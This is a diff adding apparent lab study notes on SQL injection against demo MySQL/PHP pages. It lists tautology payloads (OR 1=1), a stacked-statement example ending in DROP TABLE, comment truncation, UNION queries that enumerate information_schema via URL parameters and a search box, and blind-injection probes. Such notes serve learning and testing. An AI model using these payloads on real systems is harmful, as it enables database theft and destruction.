@@ -37,14 +37,76 @@ mysql:
     - show databases;
     - show tables from session;
         - select * from session car;
-            - describe car
+            - describe car;
             - select name,type from car;
-    - use session
+    - use session;
     - select * from car UNION select tireid,name,size,cost,1,2 FROM Tires;
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ OR 1='1 -----> inserting a true statement
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+DEMO
+- select * from user;
+    - select id from user where name='admin';
+    - select id from user where name='tom' OR 1=1;
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Stacking Statements:
+Chaining multiple statements together using a semi-colon
+
+Ex.) SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+"Ignore the rest"
+
+- Using # or -- tells the Database to ignore everything after that line
+
+Ex.) SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;
+Ex.) ... UNION select table_schema,table_name FROM information_Schema.tables;#
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+GET ----> Utilizing URL bar
+<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_name,3 FROM information_schema.tables
+<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_schema,table_name FROM information_schema.tables
+<URL>/uniondemo.php?Selection=2 UNION SELECT table_name,1,column_name FROM information_schema.columns
+<URL>/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
+<URL>/uniondemo.php?Selection=2 UNION SELECT null,name,color FROM car
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-    
+POST ----> Utilizing Search Box
+Audi' UNION SELECT 1,2,table_name,4,5 FROM information_schema.tables #
+Audi' UNION SELECT 1,2,3,table_schema,table_name FROM information_schema.tables; #
+Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #     -- "Golden" statement
+Audi' UNION SELECT 1,2,3,name,size FROM session.Tires; #
+Audi' UNION SELECT @@version,database(),3,name,size FROM session.Tires; #
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Blind Injection:
+Used when unsanitized fields give generic error or no messages
+
+GET METHOD:
+- <URL>/.php?Selection=2 Union SELECT 1,2
+- <URL>/.php?item=4 OR 1=1
+- <URL>/.php?item=4 UNION SELECT 1,2
+- <URL>/.php?item=4 UNION SELECT 1,2,@@version
+- <URL>/.php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()
+
+POST METHOD
+- Audi' UNION SELECT 1,2,3,4 #                
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
